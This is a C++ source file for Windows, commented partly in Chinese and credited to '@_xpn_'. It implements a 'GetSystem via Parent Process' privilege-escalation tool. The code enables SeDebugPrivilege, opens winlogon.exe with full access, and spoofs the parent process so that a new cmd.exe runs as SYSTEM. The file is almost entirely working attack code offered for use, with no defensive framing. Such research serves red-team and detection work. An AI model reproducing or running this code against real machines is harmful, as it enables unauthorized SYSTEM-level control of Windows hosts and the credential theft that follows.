#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <string>

//根据进程名寻找进程PID
DWORD FindProcessIDByProcessName(LPCTSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == NULL)
	{
		return 0;
	}
	int nStrLen = lstrlen(lpszProcessName);

	PROCESSENTRY32 stProcessEntry32 = { 0 };
	stProcessEntry32.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hSnapshot, &stProcessEntry32);
	BOOL bFind = FALSE;
	do
	{
		if (lstrcmp(stProcessEntry32.szExeFile, lpszProcessName) == 0)
		{
			bFind = TRUE;
			break;
		}
	} while (Process32Next(hSnapshot, &stProcessEntry32));
	CloseHandle(hSnapshot);
	if (bFind)
	{
		return stProcessEntry32.th32ProcessID;
	}
	return 0;
}
//提权
BOOL SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege) {
	TOKEN_PRIVILEGES tp;
	LUID luid;
	TOKEN_PRIVILEGES tpPrevious;
	DWORD cbPrevious = sizeof(TOKEN_PRIVILEGES);

	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = 0;

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		&tpPrevious,
		&cbPrevious
	);

	if (GetLastError() != ERROR_SUCCESS) return FALSE;

	tpPrevious.PrivilegeCount = 1;
	tpPrevious.Privileges[0].Luid = luid;

	if (bEnablePrivilege) {
		tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
	}
	else {
		tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED & tpPrevious.Privileges[0].Attributes);
	}

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tpPrevious,
		cbPrevious,
		NULL,
		NULL
	);

	if (GetLastError() != ERROR_SUCCESS) return FALSE;

	return TRUE;
}

DWORD EnableDebug(void) {
	HANDLE hToken;
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)) {
		if (GetLastError() == ERROR_NO_TOKEN) {
			if (!ImpersonateSelf(SecurityImpersonation))
				return 0;

			if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)) {
				printf("OpenThreadToken");
				return 0;
			}
		}
		else {
			return 0;
		}
	}

	// enable SeDebugPrivilege
	if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE))
	{
		printf("Error SetPrivilege");

		// close token handle
		CloseHandle(hToken);

		// indicate failure
		return 0;
	}

	return 1;
}

int main(int argc, char** argv) {
	int pid;
	HANDLE pHandle = NULL;
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T size;
	BOOL ret;

	printf("GetSystem via Parent Process\n");
	printf("Created by @_xpn_\n\n");

	//目标进程
	pid = FindProcessIDByProcessName(TEXT("winlogon.exe"));
	// We need SeDebugPriv to open processes like lsass
	EnableDebug();

	// Open the process which we will inherit the handle from
	if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)) == 0) {
		printf("Error opening PID %d\n", pid);
		return 2;
	}

	// Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));

	//欺骗父进程
	InitializeProcThreadAttributeList(NULL, 1, 0, &size);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		size
	);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);

	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	// Finally, create the process

	ret = CreateProcessA(
		"C:\\Windows\\system32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		true,
		EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		reinterpret_cast<LPSTARTUPINFOA>(&si),
		&pi
	);

	if (ret == false) {
		printf("Error creating new process (%d)\n", GetLastError());
		return 3;
	}

	printf("Enjoy your new SYSTEM process\n");

	return 0;
}
